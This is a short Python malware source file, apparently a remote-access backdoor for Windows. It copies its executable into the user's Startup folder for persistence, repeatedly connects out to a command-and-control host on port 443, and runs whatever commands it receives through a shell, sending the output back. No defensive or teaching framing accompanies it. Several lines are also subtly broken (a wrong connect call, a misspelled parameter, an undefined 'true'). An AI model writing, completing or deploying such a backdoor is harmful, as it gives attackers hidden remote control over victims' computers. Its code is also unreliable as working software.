import socket 
import threading
import subprocess
import time 
import os


CCIP = ""
CCPORT = 443



def autorun():
    filen = os.path.basename(__file__)
    exe_file = filen.replace(".py",".exe")
    os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".format(exe_file))


def conn(CCIP,CCPORT):
    try:
        client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        client.connect(CCIP,CCPORT)
        return client
    except Exception as error:
        print(error)
    

def cmd(client,data):
    try:
        proc = subprocess .Popen(data,shell=True,stdin = subprocess.PIPE, stderr  = subprocess.PIPE,stdout = subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output + b"\n")  
    except Exception as error:
        print(error)

def target(cient):
    try:
        while(True):
            data = client.recv(1024).decode().strip()
            if data == "/:kill":
                return
            else:
                threading.Thread(target =cmd, args = (client,data)).start()
    except Exception as error:
        print(error)
        client.close()





if __name__ == "__main__":
    autorun()
    while(true):
        client = conn(CCIP,CCPORT)
        if client:
            target(client)
        else:
            time.sleep(5)
